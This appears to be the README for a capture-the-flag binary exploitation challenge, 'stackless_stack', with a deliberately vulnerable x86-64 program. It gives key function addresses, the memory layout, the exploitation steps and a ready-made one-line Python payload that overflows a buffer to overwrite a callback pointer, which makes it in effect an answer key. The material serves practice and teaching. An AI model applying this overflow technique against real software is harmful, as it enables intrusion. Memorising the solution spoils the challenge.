Stackless Stack Challenge Files
================================

This archive contains:

1. stackless_stack - The vulnerable x86-64 ELF binary (COMPILED VERSION)
2. stackless_stack.c - Source code (for analysis reference)

⚠️  IMPORTANT: Use the PROVIDED BINARY (stackless_stack)!
   Self-compiled versions will have DIFFERENT memory addresses and gadgets.

Challenge Details:
- Architecture: x86-64 ELF
- Vulnerability: Buffer overflow in mmap'd memory_region_t structure
- Protection: NX enabled, No PIE, No stack canary
- Difficulty: Master Hacker

Key Addresses (for this binary):
- win_function:        0x401390
- process_data:        0x401320  
- vulnerable_function: 0x4015d0

Memory Layout:
- Offset 0-255:   data[256]       (buffer)
- Offset 256-263: callback pointer (overflow target!)
- Offset 264-271: magic value     (must = 0xdeadbeef)

Exploitation Path:
1. Analyze the binary to understand memory_region_t structure
2. Calculate overflow offset (256 bytes)
3. Overwrite callback pointer → 0x401390 (win_function)
4. Keep magic value = 0xdeadbeef
5. Binary automatically calls win_function → Get flag!

Quick Start:
```bash
# Download binary
chmod +x stackless_stack

# Verify binary info
file stackless_stack
nm stackless_stack | grep win_function

# Create simple exploit
python3 -c "import sys; sys.stdout.buffer.write(b'A'*256 + b'\x90\x13\x40\x00\x00\x00\x00\x00' + b'\xef\xbe\xad\xde\x00\x00\x00\x00')" > payload.bin

# Test exploit
./stackless_stack < payload.bin
```

Good luck!

Flag format: VNFLAG{...}
